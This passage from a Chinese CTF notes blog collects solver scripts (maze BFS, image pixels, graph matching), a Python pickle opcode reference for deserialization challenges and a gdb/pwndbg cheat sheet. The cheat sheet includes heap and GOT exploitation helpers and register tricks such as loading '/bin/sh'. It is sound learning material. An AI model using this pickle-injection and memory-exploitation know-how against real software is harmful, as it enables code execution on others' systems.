<span class="built_in">freopen</span>(<span class="string">&quot;yyh.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;out&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout);</span><br><span class="line">    <span class="type">int</span> m, u, v, step;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;step);</span><br><span class="line">    <span class="built_in">memset</span>(c.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(c.a));</span><br><span class="line">    <span class="keyword">while</span> (m--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        c.a[u][v] = c.a[v][u] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ans = <span class="built_in">Pow</span>(c, step);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans.a[<span class="number">1</span>][n]);</span><br><span class="line">    <span class="built_in">fclose</span>(stdin);</span><br><span class="line">    <span class="built_in">fclose</span>(stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="python-pickle-opcodes参考"><a href="#python-pickle-opcodes参考" class="headerlink" title="python pickle opcodes参考"></a>python pickle opcodes参考</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">来源</a>。例题:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90798308">[SUCTF 2019]Guess Game</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c：引入模块和对象，模块名和对象名以换行符分割</span><br><span class="line">&#125;：push一个空的字典，相当于push &#123;&#125;</span><br><span class="line">S: push一个字符串</span><br><span class="line">I: push一个整型</span><br><span class="line">s: pop两位 ，然后作为字典的key和value</span><br><span class="line">b: 调用__setstate__ 或者 __dict__.update()</span><br><span class="line">(：压入一个标志到栈中，表示元组的开始位置</span><br><span class="line">t：从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</span><br><span class="line">R：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</span><br><span class="line">p：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</span><br><span class="line">V、S：向栈顶压入一个（unicode）字符串</span><br><span class="line">.：表示整个程序结束</span><br></pre></td></tr></table></figure>

<h2 id="python-bfs寻最长路径实现（走迷宫）"><a href="#python-bfs寻最长路径实现（走迷宫）" class="headerlink" title="python bfs寻最长路径实现（走迷宫）"></a>python bfs寻最长路径实现（走迷宫）</h2><p><a target="_blank" rel="noopener" href="https://github.com/ev0A/SCTF2019-Write-Up#maaaaaaze">原题</a>的路径在html的td标签中，所以还需要BeautifulSoup处理一下html</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理html部分</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Maze.html&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    html_doc = file.read()</span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">lattice = soup.find_all(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;border-([a-z]+):&#x27;</span>)</span><br><span class="line">maze = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    temp1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j * <span class="number">100</span>, j * <span class="number">100</span> + <span class="number">100</span>):</span><br><span class="line">        temp = <span class="string">&quot;&quot;</span></span><br><span class="line">        result = pattern.findall(<span class="built_in">str</span>(lattice[i]))</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;top&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;u&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;bottom&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;d&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;right&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;r&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;left&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;l&quot;</span></span><br><span class="line">        temp1.append(temp)</span><br><span class="line">    maze.append(temp1)</span><br><span class="line"><span class="comment">#bfs部分，参考Nu1l师傅的脚本，更加简洁</span></span><br><span class="line">move = &#123;<span class="string">&#x27;u&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>), <span class="string">&#x27;d&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>), <span class="string">&#x27;l&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>), <span class="string">&#x27;r&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>)&#125;</span><br><span class="line">queue = deque()</span><br><span class="line">queue.append(((<span class="number">0</span>, <span class="number">0</span>), <span class="number">0</span>))</span><br><span class="line">visited = []</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">ansv = ()</span><br><span class="line"><span class="keyword">while</span> queue:</span><br><span class="line">    v, res = queue.popleft()</span><br><span class="line">    <span class="keyword">if</span> res &gt; ans:</span><br><span class="line">        ans = res</span><br><span class="line">        ansv = v</span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">        visited.append(v)</span><br><span class="line">        <span class="keyword">for</span> adj <span class="keyword">in</span> maze[v[<span class="number">0</span>]][v[<span class="number">1</span>]]:</span><br><span class="line">            queue.append(((v[<span class="number">0</span>] + move[adj][<span class="number">0</span>], v[<span class="number">1</span>] + move[adj][<span class="number">1</span>]), res + <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(ansv, ans)</span><br></pre></td></tr></table></figure>

<p>假如迷宫是png形式： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long</a> 。<a target="_blank" rel="noopener" href="https://github.com/AkaSec-1337-CyberSecurity-Club/Akasec-CTF-2024/tree/main/misc/so_long">官方脚本</a>可能更好</p>
<h2 id="PIL遍历图片的rgb值并打印"><a href="#PIL遍历图片的rgb值并打印" class="headerlink" title="PIL遍历图片的rgb值并打印"></a>PIL遍历图片的rgb值并打印</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;Chall.png&#x27;</span>)</span><br><span class="line">pix = img.load()</span><br><span class="line">w, h = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b,a = img.getpixel((i,c))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> g == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(r,g,b,a)</span><br></pre></td></tr></table></figure>

<h2 id="PIL-numpy-cv2处理带有图片像素值的txt"><a href="#PIL-numpy-cv2处理带有图片像素值的txt" class="headerlink" title="PIL+numpy+cv2处理带有图片像素值的txt"></a>PIL+numpy+cv2处理带有图片像素值的txt</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;weirdoooo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">data2 = []</span><br><span class="line"><span class="comment"># create empty img 1024*1024</span></span><br><span class="line">img = np.zeros((<span class="number">1024</span>,<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data2.append(data[i].split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2[i])):</span><br><span class="line">        <span class="keyword">if</span>  data2[i][j] == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img[i][j]=data2[i][j]</span><br><span class="line"><span class="built_in">print</span>(img.shape)</span><br><span class="line">out=img.astype(np.uint8) <span class="comment">#数值类型转换， https://numpy.org/doc/stable/reference/generated/numpy.ndarray.astype.html</span></span><br><span class="line">out = im.fromarray(out) <span class="comment">#从数组转为图片， https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.fromarray</span></span><br><span class="line"><span class="comment">#out.convert()</span></span><br><span class="line">out.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag = cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>) <span class="comment">#opencv的参考https://www.geeksforgeeks.org/python-opencv-cv2-imread-method/</span></span><br><span class="line">cv2.imshow(<span class="string">&#x27;flag&#x27;</span>,flag)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="使用pefile库读取pefile文件内容并修改"><a href="#使用pefile库读取pefile文件内容并修改" class="headerlink" title="使用pefile库读取pefile文件内容并修改"></a>使用pefile库读取pefile文件内容并修改</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/matthw/4ce2a4b9e76eb7008d55661e4792f463">来源</a>。这道题的题目文件加密了重要的检查逻辑文件，且不是直接写的pe文件，还往里面加了没用的数据。直接用pefile读取有效的数据改回来就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&quot;evil.exe&quot;</span>)</span><br><span class="line">key = <span class="string">b&#x27;PHALAN&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_resource</span>(<span class="params">pe</span>):</span><br><span class="line">    <span class="keyword">for</span> rsrc_type <span class="keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:</span><br><span class="line">        <span class="keyword">for</span> rsrc <span class="keyword">in</span> rsrc_type.directory.entries:</span><br><span class="line">            rsrc = rsrc.directory.entries[<span class="number">0</span>].data.struct</span><br><span class="line">            <span class="keyword">return</span> pe.get_data(rsrc.OffsetToData, rsrc.Size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">for</span> n, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">if</span> data[n] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> data[n] == key[n % <span class="built_in">len</span>(key)]:</span><br><span class="line">            out[n] = data[n]</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out[n] = data[n] ^ key[n % <span class="built_in">len</span>(key)]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">data = get_resource(pe)</span><br><span class="line"></span><br><span class="line">yo = decrypt(data, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dumped.pe&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(yo)</span><br></pre></td></tr></table></figure>

<h2 id="python-networkx模块使用"><a href="#python-networkx模块使用" class="headerlink" title="python networkx模块使用"></a>python networkx模块使用</h2><h1 id="最大权重配对问题（maximum-weight-matching）"><a href="#最大权重配对问题（maximum-weight-matching）" class="headerlink" title="最大权重配对问题（maximum weight matching）"></a>最大权重配对问题（maximum weight matching）</h1><p><a target="_blank" rel="noopener" href="https://enscribe.dev/ctfs/mhs/prog/matchmaker/">例题及来源</a>，涉及到基本的图论（graph theory）和开花算法（The Blossom Algorithm）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> networkx.algorithms.matching <span class="keyword">as</span> matching</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_input</span>(<span class="params">data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">list</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    data = [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, x.split())) <span class="keyword">for</span> x <span class="keyword">in</span> data.splitlines()[:-<span class="number">1</span>]]</span><br><span class="line">    [data[i].insert(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, [PORT])</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        data = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">        data = parse_input(p.recvuntilS(<span class="string">b&#x27;&gt; &#x27;</span>))</span><br><span class="line">        G: nx.Graph = nx.Graph([(i, j, &#123;<span class="string">&#x27;weight&#x27;</span>: data[i][j] + data[j][i]&#125;) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[i])) <span class="keyword">if</span> i != j])</span><br><span class="line">        M: <span class="built_in">set</span>[<span class="built_in">tuple</span>] = matching.max_weight_matching(G, maxcardinality=<span class="literal">True</span>)</span><br><span class="line">        M_S: <span class="built_in">list</span>[<span class="built_in">tuple</span>] = <span class="built_in">sorted</span>(<span class="built_in">list</span>(M) + [(b, a) <span class="keyword">for</span> a, b <span class="keyword">in</span> M])</span><br><span class="line">        result: <span class="built_in">str</span> = <span class="string">&#x27;;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span>,<span class="subst">&#123;b&#125;</span>&#x27;</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> M_S])</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        p.sendline(result.encode())</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="最短权重路径（Djikstra）"><a href="#最短权重路径（Djikstra）" class="headerlink" title="最短权重路径（Djikstra）"></a>最短权重路径（Djikstra）</h1><p><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/">https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/</a></p>
<h2 id="gdb使用-pwndbg）"><a href="#gdb使用-pwndbg）" class="headerlink" title="gdb使用(pwndbg）"></a><a target="_blank" rel="noopener" href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">gdb使用</a>(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg</a>）</h2><p>补充：</p>
<ul>
<li><p>stack &lt;num&gt;</p>
<blockquote>
<p>指定查看多少栈内容，直接stack查看的栈帧是不完整的)</p>
</blockquote>
</li>
<li><p>starti &lt;参数&gt;</p>
<blockquote>
<p>无论程序去除符号与否，该命令都能保证在程序的开始断下。可以传入参数。</p>
</blockquote>
</li>
<li><p>info file</p>
<blockquote>
<p>查看文件信息，可用于获取文件加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;i $pc</p>
<blockquote>
<p>查看当前地址的字节码的反汇编结果</p>
</blockquote>
</li>
<li><p>layout asm</p>
<blockquote>
<p>打开反汇编窗口</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.irya.unam.mx/computo/sites/manuales/fce12/debugger/cl/commandref/gdb_mode/cmd_tbreak.htm">tbreak</a></p>
<blockquote>
<p>在指定位置插入临时断点</p>
</blockquote>
</li>
<li><p>info proc mappings</p>
<blockquote>
<p>查看所有映射，可获取libc加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;10g $sp</p>
<blockquote>
<p>数字10可以任意更改，表示要查看栈上多少个元素。</p>
</blockquote>
</li>
<li><p>p $ebp-0x4</p>
<blockquote>
<p>打印对应地址的内容，可配合寄存器使用</p>
</blockquote>
</li>
<li><p>find start,end,str</p>
<blockquote>
<p>在start-end的内存中寻找str的地址</p>
</blockquote>
</li>
<li><p>disas [函数名&#x2F;地址]</p>
<blockquote>
<p>反编译置顶位置的指令。如果当前所处位置就是想要反编译的函数，可以直接disas。</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58851/can-i-set-a-breakpoint-on-memory-access-in-gdb">内存断点</a>：</p>
<ul>
<li><p>watch *addr</p>
<blockquote>
<p>gdb will break when a write occurs</p>
</blockquote>
</li>
<li><p>rwatch *addr</p>
<blockquote>
<p>gdb will break wnen a read occurs</p>
</blockquote>
</li>
<li><p>awatch *addr</p>
<blockquote>
<p>gdb will break in both cases</p>
</blockquote>
</li>
</ul>
</li>
<li><p>set $rip &#x3D; value (set $eip &#x3D; value)</p>
<ul>
<li>设置当前程序的rip&#x2F;eip（64&#x2F;32）</li>
</ul>
</li>
<li><p>jump _start</p>
<blockquote>
<p>重启程序</p>
</blockquote>
</li>
<li><p>find_fake_fast addr size</p>
<blockquote>
<p>在指定addr处寻找size大小的符合fastbin的假堆块（找到可用错位获取合法size的地址）</p>
</blockquote>
</li>
<li><p>info threads</p>
<blockquote>
<p>查看存在的线程</p>
</blockquote>
</li>
<li><p><code>thread &lt;thread_id&gt;</code></p>
<blockquote>
<p>切换到指定id的线程</p>
</blockquote>
</li>
<li><p><code>set *(char **)addr = value</code></p>
<blockquote>
<p>设置addr处的内存（64bit），参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb">https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb</a></p>
</blockquote>
<ul>
<li>同理还可以修改汇编指令，找到指令所在的地址处即可。<code>set *(unsigned char*)addr=byte</code>（ <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program">https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program</a> ）.不过这样改是暂时的，重新run的话就要再patch一次</li>
<li>以及32位下修改addr处的内存（4个字节）：<code>set *(unsigned int*)addr=value</code>。但今天测试后发现直接<code>set *addr=value</code>就行。不过这种方式只能设置32bit</li>
<li>set命令可以直接设置寄存器的内容为某个字符串。如<code>set $rdi=&quot;/bin/sh&quot;</code>。但似乎不能直接将某个地址的内容设为字符串</li>
</ul>
</li>
<li><p><code>gdb -batch -ex &#39;file &lt;program&gt;&#39; -ex &#39;disassemble &lt;func_name&gt;&#39;</code></p>
<ul>
<li>反汇编某个程序的某个函数，参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump">https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump</a></li>
</ul>
</li>
<li><p><code>jump &lt;addr&gt;</code></p>
<ul>
<li>跳转到某个地址</li>
</ul>
</li>
<li><p><code>p &amp;name_of_symbol</code></p>
<ul>
<li>获取指定symbol的偏移&#x2F;地址（运行时）</li>
</ul>
</li>
<li><p><code>finish</code></p>
<ul>
<li>Execute until selected stack frame returns</li>
</ul>
</li>
<li><p>可以用gdbserver跨docker container调试。首先在container内运行：</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 2345:2435  ... bash</span><br><span class="line">apt update &amp;&amp; apt install -y gdbserver</span><br><span class="line">gdsbserver 0:2345 ./chal </span><br></pre></td></tr></table></figure>

<p>然后本机运行：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 0:2345</span><br></pre></td></tr></table></figure>

<ul>
<li><code>define hook-stop</code><ul>
<li>设置程序每次抵达断点处时执行的命令</li>
</ul>
</li>
<li><code>command</code><ul>
<li>用于定义新命令或是给已存在的命令起alias。也可以用来设置程序每次抵达某个断点处时执行的命令</li>
</ul>
</li>
<li><code>set pagination off</code><ul>
<li>当需要展示较多信息时，gdb会分页。该命令用于禁用分页，一次输出全部信息</li>
</ul>
</li>
<li>如何调试fork的子进程： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured">https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured</a></li>
<li>一些pwndbg独有的<a target="_blank" rel="noopener" href="https://browserpwndbg.readthedocs.io/en/docs/">命令</a><ul>
<li><code>distance a b</code><ul>
<li>获取从a到b地址的差值</li>
</ul>
</li>
<li><code>vis_heap_chunks</code><ul>
<li>查看堆块（不同堆块会用不同颜色区分）</li>
</ul>
</li>
<li><code>brva offset</code><ul>
<li>在当前程序的基地址+offset处下断点。要求程序已运行（比如先starti再brva）</li>
</ul>
</li>
<li><code>leakfind</code><ul>
<li>在指定的地址范围内寻找可供泄露的地址链。使用案例：<code>leakfind 0x7ffff7db7000 --max_offset=0x200000 --page_name stack --max_depth=1</code>,尝试在0x7ffff7db7000偏移最大0x200000的区域内找指向stack地址的地址链，链长度最长为1</li>
</ul>
</li>
<li><code>got -p libc</code><ul>
<li>打印libc里的可写got表</li>
</ul>
</li>
<li>配合qemu调试16-bit&#x2F;real mode： <a target="_blank" rel="noopener" href="https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd">https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd</a> ， <a target="_blank" rel="noopener" href="https://ternet.fr/gdb_real_mode.html">https://ternet.fr/gdb_real_mode.html</a></li>
</ul>
</li>
</ul>
<h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><ul>
<li><p>docker run –platform linux&#x2F;amd64 -it ubuntu &#x2F;bin&#x2F;bash</p>
<blockquote>
<p>开启amd64位的ubuntu container，如果本地没有相应镜像就会自动拉取并开启。注意已有container后无需使用该命令再次创建一个container。</p>
</blockquote>
</li>
<li><p>docker container start [container name]</p>
<blockquote>
<p>运行一个已创建的container</p>
</blockquote>
</li>
<li><p>docker container ls</p>
<blockquote>
<p>查看已有的container</p>
</blockquote>
</li>
<li><p>docker container attach [CONTAINER ID]</p>
<blockquote>
<p>附加到一个已运行的container（可获取高亮，自动补全，需要先用<code>docker container start</code>启动container）</p>
</blockquote>
</li>
<li><p>docker rename [old name] [new name]</p>
<blockquote>
<p>重命名container</p>
</blockquote>
</li>
<li><p>docker run -i -v “`pwd`:&#x2F;chal” -t xxx@sha256:xxx</p>
<blockquote>
<p>以container形式运行镜像。一般在题目的docker file中能看到<code>xxx@sha256:xxx</code>字样，这就是镜像（image）。-v指定双向挂载，任何在container内部的chal文件夹的文件也会出现在当前目录中（`pwd`命令）。</p>
</blockquote>
</li>
<li><p>从Dockerfile build： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile">https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile</a></p>
<ul>
